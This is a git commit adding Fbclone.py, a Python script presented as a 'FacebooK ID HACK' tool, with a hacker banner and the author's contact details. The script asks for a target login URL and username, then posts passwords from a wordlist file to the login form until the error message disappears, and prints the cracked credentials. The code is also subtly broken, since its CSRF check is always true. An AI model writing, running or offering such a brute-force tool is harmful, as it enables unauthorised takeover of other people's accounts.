b937161c122719cea6d216d8e50fb0a3d8ba7473
HkMosiur909 <112892396+HKROKY909@users.noreply.github.com>
2022-09-17 10:40:04 +0600

    Create Fbclone.py

---
+++ Fbclone.py
@@ -0,0 +1,67 @@
+##!/usr/bin/python3
+# akashblackhat
+print('''\033[91m
+
+
+███    ███  ██████  ███████ ██ ██    ██ ██████  
+████  ████ ██    ██ ██      ██ ██    ██ ██   ██ 
+██ ████ ██ ██    ██ ███████ ██ ██    ██ ██████  
+██  ██  ██ ██    ██      ██ ██ ██    ██ ██   ██ 
+██      ██  ██████  ███████ ██  ██████  ██   ██ 
+
+             [!]  thank you for help me : Mahad  [!]            
+⚠️WARNING : I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
+                  [😡]FacebooK ID HACK 100%[😡]
+
+   *  Author  : Hk Mosiur
+   *  GitHub  : HKRoky909
+   *  whatsapp: +8809641033194
+   *  YouTub  : The Ghost Hacker bd
+   *  FacebooK: The Ghest Hacker vd
+   *  License : MIT         
+   ''')
+
+z = '''
+                       Checking the Server !!
+
+        [+]█████████████████████████████████████████████████[+]
+'''
+
+import requests
+import time
+import sys
+
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+
+for c in z:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
+
+try:
+    def bruteCracking(username, url, error):
+        count = 0
+        for password in passwords:
+            password = password.strip()
+            count = count + 1
+            print("Trying Password: " + str(count) + ' Time For => ' + password)
+            data_dict = {"LogInID": username, "Password": password, "Log In": "submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
+                pass
+            elif "CSRF" or "csrf" in str(response.content):
+                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                exit()
+            else:
+                print("Username: ---> " + username)
+                print("Password: ---> " + password)
+                exit()
+except:
+    print("Some Error Occurred Please Check Your Internet Connection !!")
+
+with open("passwords.txt", "r") as passwords:
+    bruteCracking(username, url, error)
+
+print("[!!] password not in list")
